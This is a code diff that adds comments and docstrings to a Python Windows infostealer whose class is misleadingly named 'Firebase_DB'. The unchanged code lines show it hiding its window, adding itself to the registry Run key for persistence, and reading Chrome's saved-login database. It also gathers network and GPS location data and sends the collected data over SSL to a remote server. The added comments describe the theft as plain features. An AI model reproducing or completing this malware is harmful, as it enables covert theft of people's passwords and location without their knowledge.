@@ -1,5 +1,6 @@
 import win32gui, win32con
 
+# Make the application working on background
 hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
@@ -23,6 +24,7 @@ import time
 
 class Firebase_DB():
     def __init__(self):
+        # Create a text file on USERPROFILE Path for save the progress, add the app to the registry
         self.data = "10\n20\n"
         self.data_lock = Lock()
         self.file_process_path = os.path.join(os.environ["USERPROFILE"], "Pro.txt")
@@ -38,22 +40,41 @@ class Firebase_DB():
                 with self.data_lock:
                     self.data = f.read()
 
+        # Waiting the computer has internet
         while True:
             if self.check_internet_connection():
                 break
+
+        # Connect the server
         self.server_ip = '' # The IP of the server
         self.server_port = 33453
         self.num_comp = 0
         self.connect_server()
         
+        # Add the number of computer to the file context
         with self.data_lock:
             self.data = f"Comp{self.num_comp}\n{self.data}"
         with open(self.file_process_path, 'w') as f:
             f.write(self.data)
+
+        # Get the data and send it the firebase server
         self.get_data()
+        # Set the file for read-only
         os.system(f"attrib +r {self.file_process_path}")
 
     def connect_server(self):
+        """
+        The function create the first connection and change the global num_comp var
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_lock = ssl.wrap_socket(client_socket)
         ssl_lock.connect((self.server_ip, self.server_port))
@@ -62,6 +83,18 @@ class Firebase_DB():
         ssl_lock.close()
 
     def check_internet_connection(self):
+        """
+        The function trying to connect google's server for check if there is internt connection
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        Boolean
+        """
         remote_server = "www.google.com"
         port = 80
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -75,6 +108,18 @@ class Firebase_DB():
             sock.close()
     
     def AddToRegistry(self):
+        """
+        The function add this app for startup applications list in the registry
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
 
         # joins the file name to end of path address
         address = os.path.abspath(__file__)
@@ -94,6 +139,18 @@ class Firebase_DB():
         reg.CloseKey(open)
         
     def DelFromRegistry(self):
+        """
+        The function remove this app for startup applications list in the registry
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
 
         # key we want to change is HKEY_CURRENT_USER 
         # key value is Software\Microsoft\Windows\CurrentVersion\Run
@@ -110,6 +167,18 @@ class Firebase_DB():
         reg.CloseKey(open)
 
     def get_data(self):
+        """
+        The function trying to get the data until it gets all of the data it needs
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
         if not "finish" in self.data:
             th1 = Thread(target=self.network_and_location_GPS)
             th2 = Thread(target=self.google_accounts)
@@ -124,6 +193,18 @@ class Firebase_DB():
             self.DelFromRegistry()
         
     def get_internal_ip(self):
+        """
+        The function trying to connect the internet and get the internal IP
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        String / None
+        """
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -134,6 +215,18 @@ class Firebase_DB():
             return None
 
     def network_and_location_GPS(self):
+        """
+        The function create a connection with the server and send data of network and location GPS to the server
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_lock = ssl.wrap_socket(client_socket)
         ssl_lock.connect((self.server_ip, self.server_port))
@@ -178,6 +271,18 @@ class Firebase_DB():
         ssl_lock.close()
             
     def google_accounts(self):
+        """
+        The function create a connection with the server and send data of google accounts to the server
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+
+        Returns
+        -------
+        None
+        """
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                             "Google", "Chrome", "User Data", "default", "Login Data")
         if os.path.exists(db_path):
@@ -295,6 +400,20 @@ class Firebase_DB():
                 return "No Passwords"
             
     def dictionary_to_string(self, dic):
+        """
+        The function get a dictionary with data and return a string in specific format for this data
+
+        Parameters
+        ----------
+        self : self
+            The attributes of the class
+        Dictionary : dic
+            The data stored in dictionary
+
+        Returns
+        -------
+        String
+        """
         str = ""
         dic = dict(dic)
         for i, (key, value) in enumerate(dic.items()):
